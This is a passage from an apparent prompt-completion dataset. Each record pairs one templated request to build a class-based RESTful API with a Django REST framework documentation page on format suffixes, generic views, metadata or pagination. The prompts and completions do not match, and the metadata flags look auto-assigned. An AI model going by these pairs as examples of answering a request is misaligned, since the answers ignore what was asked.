URLs. It works very similar to DRF serializers and fields in a sense that they can be nested except they are called filtersets and filters. That provides easy way to filter related data. Also this library is generic-purpose so it can be used to filter other sources of data and not only Django `QuerySet`s.\n\n## drf-url-filters\n\n[drf-url-filter][drf-url-filter] is a simple Django app to apply filters on drf `ModelViewSet`'s `Queryset` in a clean, simple and configurable way. It also supports validations on incoming query params and their values. A beautiful python package `Voluptuous` is being used for validations on the incoming query parameters. The best part about voluptuous is you can define your own validations as per your query params requirements.\n\n[cite]: https://docs.djangoproject.com/en/stable/topics/db/queries/#retrieving-specific-objects-with-filters\n[django-filter-docs]: https://django-filter.readthedocs.io/en/latest/index.html\n[django-filter-drf-docs]: https://django-filter.readthedocs.io/en/latest/guide/rest_framework.html\n[search-django-admin]: https://docs.djangoproject.com/en/stable/ref/contrib/admin/#django.contrib.admin.ModelAdmin.search_fields\n[django-rest-framework-filters]: https://github.com/philipn/django-rest-framework-filters\n[django-rest-framework-word-search-filter]: https://github.com/trollknurr/django-rest-framework-word-search-filter\n[django-url-filter]: https://github.com/miki725/django-url-filter\n[drf-url-filter]: https://github.com/manjitkumar/drf-url-filters\n[HStoreField]: https://docs.djangoproject.com/en/stable/ref/contrib/postgres/fields/#hstorefield\n[JSONField]: https://docs.djangoproject.com/en/stable/ref/models/fields/#django.db.models.JSONField\n[postgres-search]: https://docs.djangoproject.com/en/stable/ref/contrib/postgres/search/\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/filtering.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 373}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - urlpatterns.py\n---\n\n# Format suffixes\n\n> Section 6.2.1 does not say that content negotiation should be\nused all the time.\n>\n> &mdash; Roy Fielding, [REST discuss mailing list][cite]\n\nA common pattern for Web APIs is to use filename extensions on URLs to provide an endpoint for a given media type.  For example, 'http://example.com/api/users.json' to serve a JSON representation.\n\nAdding format-suffix patterns to each individual entry in the URLconf for your API is error-prone and non-DRY, so REST framework provides a shortcut to adding these patterns to your URLConf.\n\n## format_suffix_patterns\n\n**Signature**: format_suffix_patterns(urlpatterns, suffix_required=False, allowed=None)\n\nReturns a URL pattern list which includes format suffix patterns appended to each of the URL patterns provided.\n\nArguments:\n\n* **urlpatterns**: Required.  A URL pattern list.\n* **suffix_required**: Optional.  A boolean indicating if suffixes in the URLs should be optional or mandatory.  Defaults to `False`, meaning that suffixes are optional by default.\n* **allowed**: Optional.  A list or tuple of valid format suffixes.  If not provided, a wildcard format suffix pattern will be used.\n\nExample:\n\n    from rest_framework.urlpatterns import format_suffix_patterns\n    from blog import views\n\n    urlpatterns = [\n        path('', views.apt_root),\n        path('comments/', views.comment_list),\n        path('comments/<int:pk>/', views.comment_detail)\n    ]\n\n    urlpatterns = format_suffix_patterns(urlpatterns, allowed=['json', 'html'])\n\nWhen using `format_suffix_patterns`, you must make sure to add the `'format'` keyword argument to the corresponding views.  For example:\n\n    @api_view(['GET', 'POST'])\n    def comment_list(request, format=None):\n        # do stuff...\n\nOr with class-based views:\n\n    class CommentList(APIView):\n        def get(self, request, format=None):\n            # do stuff...\n\n        def post(self, request, format=None):\n            # do stuff...\n\nThe name of the kwarg used may be modified by using the `FORMAT_SUFFIX_KWARG` setting.\n\nAlso note that `format_suffix_patterns` does not support descending into `include` URL patterns.\n\n### Using with `i18n_patterns`\n\nIf using the `i18n_patterns` function provided by Django, as well as `format_suffix_patterns` you should make sure that the `i18n_patterns` function is applied as the final, or outermost function. For example:\n\n    urlpatterns = [\n        …\n    ]\n\n    urlpatterns = i18n_patterns(\n        format_suffix_patterns(urlpatterns, allowed=['json', 'html'])\n    )\n\n---\n\n## Query parameter formats\n\nAn alternative to the format suffixes is to include the requested format in a query parameter. REST framework provides this option by default, and it is used in the browsable API to switch between differing available representations.\n\nTo select a representation using its short format, use the `format` query parameter. For example: `http://example.com/organizations/?format=csv`.\n\nThe name of this query parameter can be modified using the `URL_FORMAT_OVERRIDE` setting. Set the value to `None` to disable this behavior.\n\n---\n\n## Accept headers vs. format suffixes\n\nThere seems to be a view among some of the Web community that filename extensions are not a RESTful pattern, and that `HTTP Accept` headers should always be used instead.\n\nIt is actually a misconception.  For example, take the following quote from Roy Fielding discussing the relative merits of query parameter media-type indicators vs. file extension media-type indicators:\n\n&ldquo;That's why I always prefer extensions.  Neither choice has anything to do with REST.&rdquo; &mdash; Roy Fielding, [REST discuss mailing list][cite2]\n\nThe quote does not mention Accept headers, but it does make it clear that format suffixes should be considered an acceptable pattern.\n\n[cite]: http://tech.groups.yahoo.com/group/rest-discuss/message/5857\n[cite2]: https://groups.yahoo.com/neo/groups/rest-discuss/conversations/topics/14844\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/format-suffixes.md", "language": "markdown", "complexity": "simple", "star_count": 29336, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 97}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - mixins.py\n    - generics.py\n---\n\n# Generic views\n\n> Django’s generic views... were developed as a shortcut for common usage patterns... They take certain common idioms and patterns found in view development and abstract them so that you can quickly write common views of data without having to repeat yourself.\n>\n> &mdash; [Django Documentation][cite]\n\nOne of the key benefits of class-based views is the way they allow you to compose bits of reusable behavior.  REST framework takes advantage of this by providing a number of pre-built views that provide for commonly used patterns.\n\nThe generic views provided by REST framework allow you to quickly build API views that map closely to your database models.\n\nIf the generic views don't suit the needs of your API, you can drop down to using the regular `APIView` class, or reuse the mixins and base classes used by the generic views to compose your own set of reusable generic views.\n\n## Examples\n\nTypically when using the generic views, you'll override the view, and set several class attributes.\n\n    from django.contrib.auth.models import User\n    from myapp.serializers import UserSerializer\n    from rest_framework import generics\n    from rest_framework.permissions import IsAdminUser\n\n    class UserList(generics.ListCreateAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        permission_classes = [IsAdminUser]\n\nFor more complex cases you might also want to override various methods on the view class.  For example.\n\n    class UserList(generics.ListCreateAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        permission_classes = [IsAdminUser]\n\n        def list(self, request):\n            # Note the use of `get_queryset()` instead of `self.queryset`\n            queryset = self.get_queryset()\n            serializer = UserSerializer(queryset, many=True)\n            return Response(serializer.data)\n\nFor very simple cases you might want to pass through any class attributes using the `.as_view()` method.  For example, your URLconf might include something like the following entry:\n\n    path('users/', ListCreateAPIView.as_view(queryset=User.objects.all(), serializer_class=UserSerializer), name='user-list')\n\n---\n\n# API Reference\n\n## GenericAPIView\n\nThis class extends REST framework's `APIView` class, adding commonly required behavior for standard list and detail views.\n\nEach of the concrete generic views provided is built by combining `GenericAPIView`, with one or more mixin classes.\n\n### Attributes\n\n**Basic settings**:\n\nThe following attributes control the basic view behavior.\n\n* `queryset` - The queryset that should be used for returning objects from this view.  Typically, you must either set this attribute, or override the `get_queryset()` method. If you are overriding a view method, it is important that you call `get_queryset()` instead of accessing this property directly, as `queryset` will get evaluated once, and those results will be cached for all subsequent requests.\n* `serializer_class` - The serializer class that should be used for validating and deserializing input, and for serializing output.  Typically, you must either set this attribute, or override the `get_serializer_class()` method.\n* `lookup_field` - The model field that should be used for performing object lookup of individual model instances.  Defaults to `'pk'`.  Note that when using hyperlinked APIs you'll need to ensure that *both* the API views *and* the serializer classes set the lookup fields if you need to use a custom value.\n* `lookup_url_kwarg` - The URL keyword argument that should be used for object lookup.  The URL conf should include a keyword argument corresponding to this value.  If unset this defaults to using the same value as `lookup_field`.\n\n**Pagination**:\n\nThe following attributes are used to control pagination when used with list views.\n\n* `pagination_class` - The pagination class that should be used when paginating list results. Defaults to the same value as the `DEFAULT_PAGINATION_CLASS` setting, which is `'rest_framework.pagination.PageNumberPagination'`. Setting `pagination_class=None` will disable pagination on this view.\n\n**Filtering**:\n\n* `filter_backends` - A list of filter backend classes that should be used for filtering the queryset.  Defaults to the same value as the `DEFAULT_FILTER_BACKENDS` setting.\n\n### Methods\n\n**Base methods**:\n\n#### `get_queryset(self)`\n\nReturns the queryset that should be used for list views, and that should be used as the base for lookups in detail views.  Defaults to returning the queryset specified by the `queryset` attribute.\n\nThis method should always be used rather than accessing `self.queryset` directly, as `self.queryset` gets evaluated only once, and those results are cached for all subsequent requests.\n\nMay be overridden to provide dynamic behavior, such as returning a queryset, that is specific to the user making the request.\n\nFor example:\n\n    def get_queryset(self):\n        user = self.request.user\n        return user.accounts.all()\n\n---\n\n**Note:** If the `serializer_class` used in the generic view spans orm relations, leading to an n+1 problem, you could optimize your queryset in this method using `select_related` and `prefetch_related`. To get more information about n+1 problem and use cases of the mentioned methods refer to related section in [django documentation][django-docs-select-related].\n\n---\n\n#### `get_object(self)`\n\nReturns an object instance that should be used for detail views.  Defaults to using the `lookup_field` parameter to filter the base queryset.\n\nMay be overridden to provide more complex behavior, such as object lookups based on more than one URL kwarg.\n\nFor example:\n\n    def get_object(self):\n        queryset = self.get_queryset()\n        filter = {}\n        for field in self.multiple_lookup_fields:\n            filter[field] = self.kwargs[field]\n\n        obj = get_object_or_404(queryset, **filter)\n        self.check_object_permissions(self.request, obj)\n        return obj\n\nNote that if your API doesn't include any object level permissions, you may optionally exclude the `self.check_object_permissions`, and simply return the object from the `get_object_or_404` lookup.\n\n#### `filter_queryset(self, queryset)`\n\nGiven a queryset, filter it with whichever filter backends are in use, returning a new queryset.\n\nFor example:\n\n    def filter_queryset(self, queryset):\n        filter_backends = [CategoryFilter]\n\n        if 'geo_route' in self.request.query_params:\n            filter_backends = [GeoRouteFilter, CategoryFilter]\n        elif 'geo_point' in self.request.query_params:\n            filter_backends = [GeoPointFilter, CategoryFilter]\n\n        for backend in list(filter_backends):\n            queryset = backend().filter_queryset(self.request, queryset, view=self)\n\n        return queryset\n\n#### `get_serializer_class(self)`\n\nReturns the class that should be used for the serializer.  Defaults to returning the `serializer_class` attribute.\n\nMay be overridden to provide dynamic behavior, such as using different serializers for read and write operations, or providing different serializers to different types of users.\n\nFor example:\n\n    def get_serializer_class(self):\n        if self.request.user.is_staff:\n            return FullAccountSerializer\n        return BasicAccountSerializer\n\n**Save and deletion hooks**:\n\nThe following methods are provided by the mixin classes, and provide easy overriding of the object save or deletion behavior.\n\n* `perform_create(self, serializer)` - Called by `CreateModelMixin` when saving a new object instance.\n* `perform_update(self, serializer)` - Called by `UpdateModelMixin` when saving an existing object instance.\n* `perform_destroy(self, instance)` - Called by `DestroyModelMixin` when deleting an object instance.\n\nThese hooks are particularly useful for setting attributes that are implicit in the request, but are not part of the request data.  For instance, you might set an attribute on the object based on the request user, or based on a URL keyword argument.\n\n    def perform_create(self, serializer):\n        serializer.save(user=self.request.user)\n\nThese override points are also particularly useful for adding behavior that occurs before or after saving an object, such as emailing a confirmation, or logging the update.\n\n    def perform_update(self, serializer):\n        instance = serializer.save()\n        send_email_confirmation(user=self.request.user, modified=instance)\n\nYou can also use these hooks to provide additional validation, by raising a `ValidationError()`. This can be useful if you need some validation logic to apply at the point of database save. For example:\n\n    def perform_create(self, serializer):\n        queryset = SignupRequest.objects.filter(user=self.request.user)\n        if queryset.exists():\n            raise ValidationError('You have already signed up')\n        serializer.save(user=self.request.user)\n\n**Other methods**:\n\nYou won't typically need to override the following methods, although you might need to call into them if you're writing custom views using `GenericAPIView`.\n\n* `get_serializer_context(self)` - Returns a dictionary containing any extra context that should be supplied to the serializer.  Defaults to including `'request'`, `'view'` and `'format'` keys.\n* `get_serializer(self, instance=None, data=None, many=False, partial=False)` - Returns a serializer instance.\n* `get_paginated_response(self, data)` - Returns a paginated style `Response` object.\n* `paginate_queryset(self, queryset)` - Paginate a queryset if required, either returning a page object, or `None` if pagination is not configured for this view.\n* `filter_queryset(self, queryset)` - Given a queryset, filter it with whichever filter backends are in use, returning a new queryset.\n\n---\n\n# Mixins\n\nThe mixin classes provide the actions that are used to provide the basic view behavior.  Note that the mixin classes provide action methods rather than defining the handler methods, such as `.get()` and `.post()`, directly.  This allows for more flexible composition of behavior.\n\nThe mixin classes can be imported from `rest_framework.mixins`.\n\n## ListModelMixin\n\nProvides a `.list(request, *args, **kwargs)` method, that implements listing a queryset.\n\nIf the queryset is populated, this returns a `200 OK` response, with a serialized representation of the queryset as the body of the response.  The response data may optionally be paginated.\n\n## CreateModelMixin\n\nProvides a `.create(request, *args, **kwargs)` method, that implements creating and saving a new model instance.\n\nIf an object is created this returns a `201 Created` response, with a serialized representation of the object as the body of the response.  If the representation contains a key named `url`, then the `Location` header of the response will be populated with that value.\n\nIf the request data provided for creating the object was invalid, a `400 Bad Request` response will be returned, with the error details as the body of the response.\n\n## RetrieveModelMixin\n\nProvides a `.retrieve(request, *args, **kwargs)` method, that implements returning an existing model instance in a response.\n\nIf an object can be retrieved this returns a `200 OK` response, with a serialized representation of the object as the body of the response.  Otherwise, it will return a `404 Not Found`.\n\n## UpdateModelMixin\n\nProvides a `.update(request, *args, **kwargs)` method, that implements updating and saving an existing model instance.\n\nAlso provides a `.partial_update(request, *args, **kwargs)` method, which is similar to the `update` method, except that all fields for the update will be optional.  This allows support for HTTP `PATCH` requests.\n\nIf an object is updated this returns a `200 OK` response, with a serialized representation of the object as the body of the response.\n\nIf the request data provided for updating the object was invalid, a `400 Bad Request` response will be returned, with the error details as the body of the response.\n\n## DestroyModelMixin\n\nProvides a `.destroy(request, *args, **kwargs)` method, that implements deletion of an existing model instance.\n\nIf an object is deleted this returns a `204 No Content` response, otherwise it will return a `404 Not Found`.\n\n---\n\n# Concrete View Classes\n\nThe following classes are the concrete generic views.  If you're using generic views this is normally the level you'll be working at unless you need heavily customized behavior.\n\nThe view classes can be imported from `rest_framework.generics`.\n\n## CreateAPIView\n\nUsed for **create-only** endpoints.\n\nProvides a `post` method handler.\n\nExtends: [GenericAPIView], [CreateModelMixin]\n\n## ListAPIView\n\nUsed for **read-only** endpoints to represent a **collection of model instances**.\n\nProvides a `get` method handler.\n\nExtends: [GenericAPIView], [ListModelMixin]\n\n## RetrieveAPIView\n\nUsed for **read-only** endpoints to represent a **single model instance**.\n\nProvides a `get` method handler.\n\nExtends: [GenericAPIView], [RetrieveModelMixin]\n\n## DestroyAPIView\n\nUsed for **delete-only** endpoints for a **single model instance**.\n\nProvides a `delete` method handler.\n\nExtends: [GenericAPIView], [DestroyModelMixin]\n\n## UpdateAPIView\n\nUsed for **update-only** endpoints for a **single model instance**.\n\nProvides `put` and `patch` method handlers.\n\nExtends: [GenericAPIView], [UpdateModelMixin]\n\n## ListCreateAPIView\n\nUsed for **read-write** endpoints to represent a **collection of model instances**.\n\nProvides `get` and `post` method handlers.\n\nExtends: [GenericAPIView], [ListModelMixin], [CreateModelMixin]\n\n## RetrieveUpdateAPIView\n\nUsed for **read or update** endpoints to represent a **single model instance**.\n\nProvides `get`, `put` and `patch` method handlers.\n\nExtends: [GenericAPIView], [RetrieveModelMixin], [UpdateModelMixin]\n\n## RetrieveDestroyAPIView\n\nUsed for **read or delete** endpoints to represent a **single model instance**.\n\nProvides `get` and `delete` method handlers.\n\nExtends: [GenericAPIView], [RetrieveModelMixin], [DestroyModelMixin]\n\n## RetrieveUpdateDestroyAPIView\n\nUsed for **read-write-delete** endpoints to represent a **single model instance**.\n\nProvides `get`, `put`, `patch` and `delete` method handlers.\n\nExtends: [GenericAPIView], [RetrieveModelMixin], [UpdateModelMixin], [DestroyModelMixin]\n\n---\n\n# Customizing the generic views\n\nOften you'll want to use the existing generic views, but use some slightly customized behavior.  If you find yourself reusing some bit of customized behavior in multiple places, you might want to refactor the behavior into a common class that you can then just apply to any view or viewset as needed.\n\n## Creating custom mixins\n\nFor example, if you need to lookup objects based on multiple fields in the URL conf, you could create a mixin class like the following:\n\n    class MultipleFieldLookupMixin:\n        \"\"\"\n        Apply this mixin to any view or viewset to get multiple field filtering\n        based on a `lookup_fields` attribute, instead of the default single field filtering.\n        \"\"\"\n        def get_object(self):\n            queryset = self.get_queryset()             # Get the base queryset\n            queryset = self.filter_queryset(queryset)  # Apply any filter backends\n            filter = {}\n            for field in self.lookup_fields:\n                if self.kwargs.get(field): # Ignore empty fields.\n                    filter[field] = self.kwargs[field]\n            obj = get_object_or_404(queryset, **filter)  # Lookup the object\n            self.check_object_permissions(self.request, obj)\n            return obj\n\nYou can then simply apply this mixin to a view or viewset anytime you need to apply the custom behavior.\n\n    class RetrieveUserView(MultipleFieldLookupMixin, generics.RetrieveAPIView):\n        queryset = User.objects.all()\n        serializer_class = UserSerializer\n        lookup_fields = ['account', 'username']\n\nUsing custom mixins is a good option if you have custom behavior that needs to be used.\n\n## Creating custom base classes\n\nIf you are using a mixin across multiple views, you can take this a step further and create your own set of base views that can then be used throughout your project.  For example:\n\n    class BaseRetrieveView(MultipleFieldLookupMixin,\n                           generics.RetrieveAPIView):\n        pass\n\n    class BaseRetrieveUpdateDestroyView(MultipleFieldLookupMixin,\n                                        generics.RetrieveUpdateDestroyAPIView):\n        pass\n\nUsing custom base classes is a good option if you have custom behavior that consistently needs to be repeated across a large number of views throughout your project.\n\n---\n\n# PUT as create\n\nPrior to version 3.0 the REST framework mixins treated `PUT` as either an update or a create operation, depending on if the object already existed or not.\n\nAllowing `PUT` as create operations is problematic, as it necessarily exposes information about the existence or non-existence of objects. It's also not obvious that transparently allowing re-creating of previously deleted instances is necessarily a better default behavior than simply returning `404` responses.\n\nBoth styles \"`PUT` as 404\" and \"`PUT` as create\" can be valid in different circumstances, but from version 3.0 onwards we now use 404 behavior as the default, due to it being simpler and more obvious.\n\nIf you need to generic PUT-as-create behavior you may want to include something like [this `AllowPUTAsCreateMixin` class](https://gist.github.com/tomchristie/a2ace4577eff2c603b1b) as a mixin to your views.\n\n---\n\n# Third party packages\n\nThe following third party packages provide additional generic view implementations.\n\n## Django Rest Multiple Models\n\n[Django Rest Multiple Models][django-rest-multiple-models] provides a generic view (and mixin) for sending multiple serialized models and/or querysets via a single API request.\n\n\n[cite]: https://docs.djangoproject.com/en/stable/ref/class-based-views/#base-vs-generic-views\n[GenericAPIView]: #genericapiview\n[ListModelMixin]: #listmodelmixin\n[CreateModelMixin]: #createmodelmixin\n[RetrieveModelMixin]: #retrievemodelmixin\n[UpdateModelMixin]: #updatemodelmixin\n[DestroyModelMixin]: #destroymodelmixin\n[django-rest-multiple-models]: https://github.com/MattBroach/DjangoRestMultipleModels\n[django-docs-select-related]: https://docs.djangoproject.com/en/stable/ref/models/querysets/#django.db.models.query.QuerySet.select_related\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/generic-views.md", "language": "markdown", "complexity": "complex", "star_count": 29336, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 399}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - metadata.py\n---\n\n# Metadata\n\n> [The `OPTIONS`] method allows a client to determine the options and/or requirements associated with a resource, or the capabilities of a server, without implying a resource action or initiating a resource retrieval.\n>\n> &mdash; [RFC7231, Section 4.3.7.][cite]\n\nREST framework includes a configurable mechanism for determining how your API should respond to `OPTIONS` requests. This allows you to return API schema or other resource information.\n\nThere are not currently any widely adopted conventions for exactly what style of response should be returned for HTTP `OPTIONS` requests, so we provide an ad-hoc style that returns some useful information.\n\nHere's an example response that demonstrates the information that is returned by default.\n\n    HTTP 200 OK\n    Allow: GET, POST, HEAD, OPTIONS\n    Content-Type: application/json\n\n    {\n        \"name\": \"To Do List\",\n        \"description\": \"List existing 'To Do' items, or create a new item.\",\n        \"renders\": [\n            \"application/json\",\n            \"text/html\"\n        ],\n        \"parses\": [\n            \"application/json\",\n            \"application/x-www-form-urlencoded\",\n            \"multipart/form-data\"\n        ],\n        \"actions\": {\n            \"POST\": {\n                \"note\": {\n                    \"type\": \"string\",\n                    \"required\": false,\n                    \"read_only\": false,\n                    \"label\": \"title\",\n                    \"max_length\": 100\n                }\n            }\n        }\n    }\n\n## Setting the metadata scheme\n\nYou can set the metadata class globally using the `'DEFAULT_METADATA_CLASS'` settings key:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_METADATA_CLASS': 'rest_framework.metadata.SimpleMetadata'\n    }\n\nOr you can set the metadata class individually for a view:\n\n    class APIRoot(APIView):\n        metadata_class = APIRootMetadata\n\n        def get(self, request, format=None):\n            return Response({\n                ...\n            })\n\nThe REST framework package only includes a single metadata class implementation, named `SimpleMetadata`. If you want to use an alternative style you'll need to implement a custom metadata class.\n\n## Creating schema endpoints\n\nIf you have specific requirements for creating schema endpoints that are accessed with regular `GET` requests, you might consider re-using the metadata API for doing so.\n\nFor example, the following additional route could be used on a viewset to provide a linkable schema endpoint.\n\n    @action(methods=['GET'], detail=False)\n    def api_schema(self, request):\n        meta = self.metadata_class()\n        data = meta.determine_metadata(request, self)\n        return Response(data)\n\nThere are a couple of reasons that you might choose to take this approach, including that `OPTIONS` responses [are not cacheable][no-options].\n\n---\n\n# Custom metadata classes\n\nIf you want to provide a custom metadata class you should override `BaseMetadata` and implement the `determine_metadata(self, request, view)` method.\n\nUseful things that you might want to do could include returning schema information, using a format such as [JSON schema][json-schema], or returning debug information to admin users.\n\n## Example\n\nThe following class could be used to limit the information that is returned to `OPTIONS` requests.\n\n    class MinimalMetadata(BaseMetadata):\n        \"\"\"\n        Don't include field and other information for `OPTIONS` requests.\n        Just return the name and description.\n        \"\"\"\n        def determine_metadata(self, request, view):\n            return {\n                'name': view.get_view_name(),\n                'description': view.get_view_description()\n            }\n\nThen configure your settings to use this custom class:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_METADATA_CLASS': 'myproject.apps.core.MinimalMetadata'\n    }\n\n# Third party packages\n\nThe following third party packages provide additional metadata implementations.\n\n## DRF-schema-adapter\n\n[drf-schema-adapter][drf-schema-adapter] is a set of tools that makes it easier to provide schema information to frontend frameworks and libraries. It provides a metadata mixin as well as 2 metadata classes and several adapters suitable to generate [json-schema][json-schema] as well as schema information readable by various libraries.\n\nYou can also write your own adapter to work with your specific frontend.\nIf you wish to do so, it also provides an exporter that can export those schema information to json files.\n\n[cite]: https://tools.ietf.org/html/rfc7231#section-4.3.7\n[no-options]: https://www.mnot.net/blog/2012/10/29/NO_OPTIONS\n[json-schema]: https://json-schema.org/\n[drf-schema-adapter]: https://github.com/drf-forms/drf-schema-adapter\n", "metadata": {"source": "github.com/encode/django-rest-framework", "file_path": "docs/api-guide/metadata.md", "language": "markdown", "complexity": "medium", "star_count": 29336, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 125}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design RESTful API architecture with proper versioning and documentation with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nsource:\n    - pagination.py\n---\n\n# Pagination\n\n> Django provides a few classes that help you manage paginated data – that is, data that’s split across several pages, with “Previous/Next” links.\n>\n> &mdash; [Django documentation][cite]\n\nREST framework includes support for customizable pagination styles. This allows you to modify how large result sets are split into individual pages of data.\n\nThe pagination API can support either:\n\n* Pagination links that are provided as part of the content of the response.\n* Pagination links that are included in response headers, such as `Content-Range` or `Link`.\n\nThe built-in styles currently all use links included as part of the content of the response. This style is more accessible when using the browsable API.\n\nPagination is only performed automatically if you're using the generic views or viewsets. If you're using a regular `APIView`, you'll need to call into the pagination API yourself to ensure you return a paginated response. See the source code for the `mixins.ListModelMixin` and `generics.GenericAPIView` classes for an example.\n\nPagination can be turned off by setting the pagination class to `None`.\n\n## Setting the pagination style\n\nThe pagination style may be set globally, using the `DEFAULT_PAGINATION_CLASS` and `PAGE_SIZE` setting keys. For example, to use the built-in limit/offset pagination, you would do something like this:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.LimitOffsetPagination',\n        'PAGE_SIZE': 100\n    }\n\nNote that you need to set both the pagination class, and the page size that should be used.  Both `DEFAULT_PAGINATION_CLASS` and `PAGE_SIZE` are `None` by default.\n\nYou can also set the pagination class on an individual view by using the `pagination_class` attribute. Typically you'll want to use the same pagination style throughout your API, although you might want to vary individual aspects of the pagination, such as default or maximum page size, on a per-view basis.\n\n## Modifying the pagination style\n\nIf you want to modify particular aspects of the pagination style, you'll want to override one of the pagination classes, and set the attributes that you want to change.\n\n    class LargeResultsSetPagination(PageNumberPagination):\n        page_size = 1000\n        page_size_query_param = 'page_size'\n        max_page_size = 10000\n\n    class StandardResultsSetPagination(PageNumberPagination):\n        page_size = 100\n        page_size_query_param = 'page_size'\n        max_page_size = 1000\n\nYou can then apply your new style to a view using the `pagination_class` attribute:\n\n    class BillingRecordsView(generics.ListAPIView):\n        queryset = Billing.objects.all()\n        serializer_class = BillingRecordsSerializer\n        pagination_class = LargeResultsSetPagination\n\nOr apply the style globally, using the `DEFAULT_PAGINATION_CLASS` settings key. For example:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'apps.core.pagination.StandardResultsSetPagination'\n    }\n\n---\n\n# API Reference\n\n## PageNumberPagination\n\nThis pagination style accepts a single number page number in the request query parameters.\n\n**Request**:\n\n    GET https://api.example.org/accounts/?page=4\n\n**Response**:\n\n    HTTP 200 OK\n    {\n        \"count\": 1023,\n        \"next\": \"https://api.example.org/accounts/?page=5\",\n        \"previous\": \"https://api.example.org/accounts/?page=3\",\n        \"results\": [\n           …\n        ]\n    }\n\n#### Setup\n\nTo enable the `PageNumberPagination` style globally, use the following configuration, and set the `PAGE_SIZE` as desired:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.PageNumberPagination',\n        'PAGE_SIZE': 100\n    }\n\nOn `GenericAPIView` subclasses you may also set the `pagination_class` attribute to select `PageNumberPagination` on a per-view basis.\n\n#### Configuration\n\nThe `PageNumberPagination` class includes a number of attributes that may be overridden to modify the pagination style.\n\nTo set these attributes you should override the `PageNumberPagination` class, and then enable your custom pagination class as above.\n\n* `django_paginator_class` - The Django Paginator class to use. Default is `django.core.paginator.Paginator`, which should be fine for most use cases.\n* `page_size` - A numeric value indicating the page size. If set, this overrides the `PAGE_SIZE` setting. Defaults to the same value as the `PAGE_SIZE` settings key.\n* `page_query_param` - A string value indicating the name of the query parameter to use for the pagination control.\n* `page_size_query_param` - If set, this is a string value indicating the name of a query parameter that allows the client to set the page size on a per-request basis. Defaults to `None`, indicating that the client may not control the requested page size.\n* `max_page_size` - If set, this is a numeric value indicating the maximum allowable requested page size. This attribute is only valid if `page_size_query_param` is also set.\n* `last_page_strings` - A list or tuple of string values indicating values that may be used with the `page_query_param` to request the final page in the set. Defaults to `('last',)`\n* `template` - The name of a template to use when rendering pagination controls in the browsable API. May be overridden to modify the rendering style, or set to `None` to disable HTML pagination controls completely. Defaults to `\"rest_framework/pagination/numbers.html\"`.\n\n---\n\n## LimitOffsetPagination\n\nThis pagination style mirrors the syntax used when looking up multiple database records. The client includes both a \"limit\" and an\n\"offset\" query parameter. The limit indicates the maximum number of items to return, and is equivalent to the `page_size` in other styles. The offset indicates the starting position of the query in relation to the complete set of unpaginated items.\n\n**Request**:\n\n    GET https://api.example.org/accounts/?limit=100&offset=400\n\n**Response**:\n\n    HTTP 200 OK\n    {\n        \"count\": 1023,\n        \"next\": \"https://api.example.org/accounts/?limit=100&offset=500\",\n        \"previous\": \"https://api.example.org/accounts/?limit=100&offset=300\",\n        \"results\": [\n           …\n        ]\n    }\n\n#### Setup\n\nTo enable the `LimitOffsetPagination` style globally, use the following configuration:\n\n    REST_FRAMEWORK = {\n        'DEFAULT_PAGINATION_CLASS': 'rest_framework.pagination.LimitOffsetPagination'\n    }\n\nOptionally, you may also set a `PAGE_SIZE` key. If the `PAGE_SIZE` parameter is also used then the `limit` query parameter will be optional, and may be omitted by the client.\n\nOn `GenericAPIView` subclasses you may also set the `pagination_class` attribute to select `LimitOffsetPagination` on a per-view basis.\n\n#### Configuration\n\nThe `LimitOffsetPagination` class includes a number of 